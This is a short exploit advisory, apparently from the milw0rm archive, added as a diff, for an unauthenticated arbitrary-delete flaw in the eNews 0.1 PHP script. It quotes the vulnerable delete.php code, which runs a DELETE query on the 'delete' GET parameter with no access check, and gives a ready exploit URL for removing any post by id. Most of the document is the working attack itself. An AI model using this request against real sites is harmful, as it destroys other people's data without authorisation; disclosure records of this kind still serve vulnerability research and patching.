@@ -1,0 +1,29 @@
+eNews 0.1 (delete.php) Arbitrary Delete Post Vulnerability
+
+
+Author: iLker Kandemir [MEFISTO]
+
+Script download : http://www.hotscripts.com/Detailed/81086.html
+
+script demo : http://emvvy.com/demos/enews/
+
+site : www.dumenci.net
+
+----------------------------------------------------------------
+//poc:
+
+if ((isset($_GET['delete'])) && ($_GET['delete'] != "")) {
+  $deleteSQL = sprintf("DELETE FROM news WHERE id=%s",
+                       GetSQLValueString($_GET['delete'], "int"));
+
+----------------------------------------------------------------
+
+//exploit :
+
+http://[site]/delete.php?delete=[eNews_id]
+
+----------------------------------------------------------------
+
+tnx : aLL my FriEndZ 
+
+# milw0rm.com [2008-06-21]
